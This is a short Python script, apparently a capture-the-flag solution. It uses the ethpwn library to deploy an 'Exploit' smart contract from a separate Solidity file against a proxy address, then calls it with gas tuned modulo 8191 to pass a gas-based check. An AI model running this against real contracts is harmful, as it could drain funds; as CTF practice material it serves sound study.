#!/usr/bin/env python3

from ethpwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('exploit_contract_source', type=str)
parser.add_argument('proxy_addr', type=str)
parser.add_argument('--wallet', type=str, default='Laptop CTF Metamask', help="Wallet to use for the exploit transaction")
ARGS = parser.parse_args()

context.log_level = 'DEBUG'

MY_WALLET = get_wallet(ARGS.wallet)
assert MY_WALLET is not None
context.default_from_addr = MY_WALLET.address
context.default_signing_key = MY_WALLET.private_key

CONTRACT_METADATA.add_contracts_from_solidity_files([ARGS.exploit_contract_source])

# (+2) if the gas is returned as if the instruction had already executed
gas_consumed_by_gas_instruction = (1978936-1941780) + 2
too_much = gas_consumed_by_gas_instruction % 8191
full_gas = 1978936 + (8191 - too_much)  + 103 + 3

with CONTRACT_METADATA['Exploit'].deploy_destructible(ARGS.proxy_addr) as (tx_hash, target):

    transact(target.functions.exploit(), gas=full_gas, force=True)
